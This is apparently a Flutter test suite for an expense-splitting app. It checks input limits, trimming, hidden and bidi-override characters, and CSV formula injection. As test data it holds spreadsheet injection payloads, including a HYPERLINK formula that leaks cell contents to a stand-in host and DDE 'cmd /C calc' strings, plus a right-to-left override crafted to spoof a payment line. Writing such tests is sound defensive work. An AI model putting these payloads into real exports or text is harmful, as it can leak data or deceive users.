// QA SECURITY round 1: input limits, trimming, control characters and
// CSV/formula injection, through the real Ledger (SPEC 5.16, 5.10).
//
// SPEC 5.16: "Limits enforced by Ledger (throw LedgerException(invalidInput)):
// group name 1..60 characters, member display name 1..40, description
// 1..120, notes <= 1000, <= 50 active members per group, total
// 1..Money.maxMinor. Text is trimmed."
import 'package:flutter_test/flutter_test.dart';
import 'package:settle_up/core/csv_export.dart';
import 'package:settle_up/core/hlc.dart';
import 'package:settle_up/core/models.dart';
import 'package:settle_up/core/money.dart';
import 'package:settle_up/core/ops.dart';
import 'package:settle_up/data/repositories.dart';

import '../../sync/support/phone.dart';

Matcher get invalidInput => throwsA(
  isA<LedgerException>().having(
    (e) => e.code,
    'code',
    LedgerErrorCode.invalidInput,
  ),
);

void main() {
  late TestPhone phone;
  late Seed s;

  setUp(() async {
    phone = await TestPhone.create('a');
    s = await phone.seedGroup(expenses: 0);
  });

  tearDown(() => phone.close());

  ExpenseDraft draft({
    String description = 'Dinner',
    String notes = '',
    int total = 1000,
  }) => ExpenseDraft(
    groupId: s.g,
    description: description,
    total: total,
    currency: 'INR',
    paidBy: SplitSpec.single(s.a, total),
    owedBy: SplitSpec.equal([s.a, s.b]),
    category: 'food.dining',
    date: utcFromMillis(kBaseMs),
    notes: notes,
  );

  NewGroup newGroup(String name, {List<String> members = const []}) => NewGroup(
    name: name,
    type: GroupType.trip,
    currency: 'INR',
    newMemberNames: members,
  );

  group('limits at the boundary are accepted', () {
    test(
      'group name of 60, member of 40, description of 120, notes of 1000',
      () async {
        final g = await phone.ledger.createGroup(
          newGroup('g' * 60, members: ['m' * 40]),
        );
        expect(phone.state.groups[g]!.group!.name.length, 60);
        final id = await phone.ledger.addExpense(
          draft(description: 'd' * 120, notes: 'n' * 1000),
        );
        final e = phone.state.groups[s.g]!.expenses[id]!;
        expect(e.description.length, 120);
        expect(e.notes.length, 1000);
      },
    );

    test('total of 1 and Money.maxMinor', () async {
      await phone.ledger.addExpense(draft(total: 1));
      await phone.ledger.addExpense(draft(total: Money.maxMinor));
      await expectLater(phone.ledger.addExpense(draft(total: 0)), invalidInput);
      await expectLater(
        phone.ledger.addExpense(draft(total: Money.maxMinor + 1)),
        invalidInput,
      );
      await expectLater(
        phone.ledger.addExpense(draft(total: -5)),
        invalidInput,
      );
    });
  });

  group('trimming', () {
    test('names and descriptions are stored trimmed', () async {
      final g = await phone.ledger.createGroup(
        newGroup('  Goa trip \n', members: ['\t Priya  ']),
      );
      final gs = phone.state.groups[g]!;
      expect(gs.group!.name, 'Goa trip');
      expect(gs.members.values.map((m) => m.displayName), contains('Priya'));
      final id = await phone.ledger.addExpense(
        draft(description: '  Taxi  ', notes: '  late  '),
      );
      final e = phone.state.groups[s.g]!.expenses[id]!;
      expect(e.description, 'Taxi');
      expect(e.notes, 'late');
    });

    test('whitespace-only names are refused', () async {
      await expectLater(
        phone.ledger.createGroup(newGroup('   ')),
        invalidInput,
      );
      await expectLater(
        phone.ledger.addMember(s.g, displayName: ' \u00A0\u2003 '),
        invalidInput,
      );
      await expectLater(
        phone.ledger.addExpense(draft(description: '\n\t')),
        invalidInput,
      );
    });
  });

  group(
    'SPEC 5.16 limits enforced by the Ledger',
    () {
      test('group name over 60 characters', () async {
        await expectLater(
          phone.ledger.createGroup(newGroup('g' * 61)),
          invalidInput,
        );
        await expectLater(
          phone.ledger.updateGroup(s.g, GroupPatch(name: 'g' * 61)),
          invalidInput,
        );
      });

      test('member display name over 40 characters', () async {
        await expectLater(
          phone.ledger.createGroup(newGroup('Trip', members: ['m' * 41])),
          invalidInput,
        );
        await expectLater(
          phone.ledger.addMember(s.g, displayName: 'm' * 41),
          invalidInput,
        );
        await expectLater(
          phone.ledger.renameMember(s.g, s.b, 'm' * 41),
          invalidInput,
        );
      });

      test('description over 120 characters', () async {
        await expectLater(
          phone.ledger.addExpense(draft(description: 'd' * 121)),
          invalidInput,
        );
      });

      test('notes over 1000 characters', () async {
        await expectLater(
          phone.ledger.addExpense(draft(notes: 'n' * 1001)),
          invalidInput,
        );
      });

      test('a 51st active member', () async {
        for (var i = 0; i < 48; i++) {
          await phone.ledger.addMember(s.g, displayName: 'P$i');
        }
        expect(phone.state.groups[s.g]!.activeMembers, hasLength(50));
        await expectLater(
          phone.ledger.addMember(s.g, displayName: 'One too many'),
          invalidInput,
        );
      });

      test(
        'a megabyte description is refused, not written to the op log',
        () async {
          final before = phone.opCount(s.g);
          await expectLater(
            phone.ledger.addExpense(draft(description: 'x' * (1 << 20))),
            invalidInput,
          );
          expect(phone.opCount(s.g), before);
        },
      );
    },
  );

  group(
    'control and bidi override characters',
    () {
      // U+202E RIGHT-TO-LEFT OVERRIDE makes "Bob\u202Eevil" render as
      // "Bobvile" and flips the words after it in the same line, e.g.
      // "{name} paid {name}" in the activity feed.
      const hostile = <String, String>{
        'RLO': 'Bob\u202E5000 diap',
        'LRO': '\u202DAlex',
        'RLI': 'Al\u2067ex',
        'NUL': 'Al\u0000ex',
        'BEL': 'Al\u0007ex',
        'newline inside': 'Al\nex',
        'zero width only': '\u200B\u200B',
      };
      for (final MapEntry(key: what, value: name) in hostile.entries) {
        test('member name with $what is refused or cleaned', () async {
          try {
            final id = await phone.ledger.addMember(s.g, displayName: name);
            final stored = phone.state.groups[s.g]!.members[id]!.displayName;
            expect(
              stored.runes.any(_isControlOrBidi),
              isFalse,
              reason: 'stored ${stored.runes.toList()}',
            );
            expect(stored.trim(), isNotEmpty);
          } on LedgerException catch (e) {
            expect(e.code, LedgerErrorCode.invalidInput);
          }
        });
      }

      test(
        'group name and description with RLO are refused or cleaned',
        () async {
          Future<String> storedGroupName() async {
            final g = await phone.ledger.createGroup(
              newGroup('Trip\u202Epirt'),
            );
            return phone.state.groups[g]!.group!.name;
          }

          Future<String> storedDescription() async {
            final id = await phone.ledger.addExpense(
              draft(description: 'Taxi\u202E00.005'),
            );
            return phone.state.groups[s.g]!.expenses[id]!.description;
          }

          for (final read in [storedGroupName, storedDescription]) {
            try {
              final v = await read();
              expect(v.runes.any(_isControlOrBidi), isFalse);
            } on LedgerException catch (e) {
              expect(e.code, LedgerErrorCode.invalidInput);
            }
          }
        },
      );
    },
  );

  group('CSV formula injection', () {
    Future<String> csvWith({
      required String member,
      required String description,
    }) async {
      final m = await phone.ledger.addMember(s.g, displayName: member);
      await phone.ledger.addExpense(
        ExpenseDraft(
          groupId: s.g,
          description: description,
          total: 1000,
          currency: 'INR',
          paidBy: SplitSpec.single(m, 1000),
          owedBy: SplitSpec.equal([s.a, m]),
          category: 'food.dining',
          date: utcFromMillis(kBaseMs),
        ),
      );
      await phone.ledger.recordPayment(
        PaymentDraft(
          groupId: s.g,
          from: m,
          to: s.a,
          amount: 100,
          currency: 'INR',
          method: PaymentMethod.cash,
          date: utcFromMillis(kBaseMs + 1),
        ),
      );
      return CsvExport.group(phone.state.groups[s.g]!);
    }

    List<String> cells(String csv) {
      // Minimal RFC 4180 reader for the assertions.
      final out = <String>[];
      final b = StringBuffer();
      var quoted = false;
      for (var i = 0; i < csv.length; i++) {
        final c = csv[i];
        if (quoted) {
          if (c == '"' && i + 1 < csv.length && csv[i + 1] == '"') {
            b.write('"');
            i++;
          } else if (c == '"') {
            quoted = false;
          } else {
            b.write(c);
          }
        } else if (c == '"') {
          quoted = true;
        } else if (c == ',' || c == '\n') {
          out.add(b.toString().replaceAll('\r', ''));
          b.clear();
        } else {
          b.write(c);
        }
      }
      return out;
    }

    for (final payload in [
      // At most 40 characters: member names are capped (SPEC 5.16).
      '=HYPERLINK("http://evil.ex/?"&A1,"x")',
      '+1+cmd|\' /C calc\'!A0',
      '-2+3',
      '@SUM(1+1)*cmd|\' /C calc\'!A0',
    ]) {
      test('a cell starting with ${payload[0]} is neutralised', () async {
        // Member names are trimmed by the Ledger; formula text survives.
        final csv = await csvWith(member: payload, description: payload);
        for (final cell in cells(csv)) {
          if (cell.contains('HYPERLINK') ||
              cell.contains('cmd|') ||
              cell == '-2+3') {
            expect(cell, startsWith("'"), reason: 'cell: $cell');
          }
        }
      });
    }

    test(
      'tab- and CR-led text from a peer (not trimmed) is neutralised',
      () async {
        await phone.ledger.addExpense(draft());
        final template = phone.opsOf(s.g).last;
        const peer = 'pppppppp-0000-7000-8000-000000000001';
        final op = Operation(
          id: 'peer-op-1',
          groupId: s.g,
          deviceId: peer,
          counter: 1,
          hlc: Hlc(template.hlc.millis + 1, 0, peer),
          entityType: EntityType.expense,
          entityId: 'peer-expense',
          kind: OpKind.create,
          payload: {...template.payload, ExpenseFields.description: '\t=1+1'},
        );
        await phone.ledger.applyRemote(s.g, [op]);
        final csv = CsvExport.group(phone.state.groups[s.g]!);
        expect(csv, contains("'\t=1+1"));
        expect(csv, isNot(contains(',\t=1+1')));
      },
    );

    test(
      'the payment line built from a hostile payer name is neutralised',
      () async {
        final csv = await csvWith(member: '=1+1', description: 'Lunch');
        final paid = cells(csv).where((c) => c.contains(' paid ')).toList();
        expect(paid, isNotEmpty);
        for (final c in paid) {
          expect(c, startsWith("'"), reason: c);
        }
      },
    );
  });

  // ------------------------------------------------- QA SECURITY round 2 --

  group('round 2: limits on the edit paths too', () {
    test('updateGroup with a 61-character name', () async {
      await expectLater(
        phone.ledger.updateGroup(s.g, GroupPatch(name: 'g' * 61)),
        invalidInput,
      );
      expect(phone.state.groups[s.g]!.group!.name, isNot('g' * 61));
    });

    test('renameMember with a 41-character name', () async {
      await expectLater(
        phone.ledger.renameMember(s.g, s.b, 'm' * 41),
        invalidInput,
      );
    });

    test('updateExpense with a 121-character description', () async {
      final id = await phone.ledger.addExpense(draft());
      await expectLater(
        phone.ledger.updateExpense(id, draft(description: 'd' * 121)),
        invalidInput,
      );
      await expectLater(
        phone.ledger.updateExpense(id, draft(notes: 'n' * 1001)),
        invalidInput,
      );
    });

    test('recordPayment with 1001 characters of notes', () async {
      await expectLater(
        phone.ledger.recordPayment(
          PaymentDraft(
            groupId: s.g,
            from: s.a,
            to: s.b,
            amount: 100,
            currency: 'INR',
            method: PaymentMethod.cash,
            date: utcFromMillis(kBaseMs),
            notes: 'n' * 1001,
          ),
        ),
        invalidInput,
      );
    });

    test('renameMember to an invisible name', () async {
      await expectLater(
        phone.ledger.renameMember(s.g, s.b, '\u200B\u2060\uFEFF'),
        invalidInput,
      );
    });
  });

  group('round 2: invisible names the R1-06 cleaning misses', () {
    // Characters that render as nothing (or as blank space) but are not in
    // TextRules.isHidden and are not removed by String.trim().
    const invisible = <String, String>{
      'Hangul filler U+3164': '\u3164',
      'Hangul choseong filler U+115F': '\u115F',
      'halfwidth Hangul filler U+FFA0': '\uFFA0',
      'braille blank U+2800': '\u2800\u2800',
      'soft hyphen U+00AD': '\u00AD',
      'combining grapheme joiner U+034F': '\u034F',
      'invisible times U+2062': '\u2062',
      'Mongolian vowel separator U+180E': '\u180E',
      'tag characters U+E0041': '\u{E0041}\u{E0042}',
    };
    for (final MapEntry(key: what, value: name) in invisible.entries) {
      test('a member name of only $what is refused', () async {
        try {
          final id = await phone.ledger.addMember(s.g, displayName: name);
          final stored = phone.state.groups[s.g]!.members[id]!.displayName;
          fail('stored an invisible name ${stored.runes.toList()}');
        } on LedgerException catch (e) {
          expect(e.code, LedgerErrorCode.invalidInput);
        }
      });
    }

    test('U+2028 / U+2029 inside a one-line name become spaces', () async {
      final id = await phone.ledger.addMember(s.g, displayName: 'Al\u2028ex\u2029Z');
      expect(phone.state.groups[s.g]!.members[id]!.displayName, 'Al ex Z');
    });

    test('an Arabic letter mark U+061C and LRM/RLM are dropped', () async {
      final id = await phone.ledger.addMember(s.g, displayName: '\u061CBob\u200E\u200F');
      expect(phone.state.groups[s.g]!.members[id]!.displayName, 'Bob');
    });

    test('emoji ZWJ sequences survive cleaning and count as one', () async {
      const family = '\u{1F468}\u200D\u{1F469}\u200D\u{1F467}';
      final id = await phone.ledger.addMember(s.g, displayName: family * 5);
      expect(phone.state.groups[s.g]!.members[id]!.displayName, family * 5);
      // 8 code units per family: 40 of them exceed the 4-units-per-char cap.
      await expectLater(
        phone.ledger.addMember(s.g, displayName: family * 41),
        invalidInput,
      );
    });
  });
}

bool _isControlOrBidi(int r) =>
    (r < 0x20 && r != 0x09) ||
    (r >= 0x7f && r <= 0x9f) ||
    (r >= 0x200b && r <= 0x200f) ||
    (r >= 0x202a && r <= 0x202e) ||
    (r >= 0x2066 && r <= 0x2069) ||
    r == 0xfeff;
